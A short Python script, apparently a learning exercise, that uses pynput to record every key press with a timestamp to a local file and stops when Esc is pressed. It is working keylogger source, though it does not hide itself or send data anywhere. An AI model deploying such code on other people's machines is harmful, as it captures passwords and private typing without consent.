#keystroke logger
#whenever user types in a key it will be logged into a file called keylogs.txt and will also have the timestamp of the key press
#used information from https://pynput.readthedocs.io/en/latest/keyboard.html to help wtih the code 
import pynput.keyboard
import logging
from datetime import datetime

#we need to first set up the .txt file to log the keystrokes 
log_file = "keystrokes.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='[%(asctime)s]: %(message)s')
#sets up logging to the file keystrokes.txt where every line has a bracketed timestamp and the key pressed 

#now we set up the listener function to listen for the key strokes 

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))
#listenese for key stroke if there is an error it will log the key as a string 

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False
#on key release if the key was the escape key then we exit the listener 


#now we need to start up the listener 
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    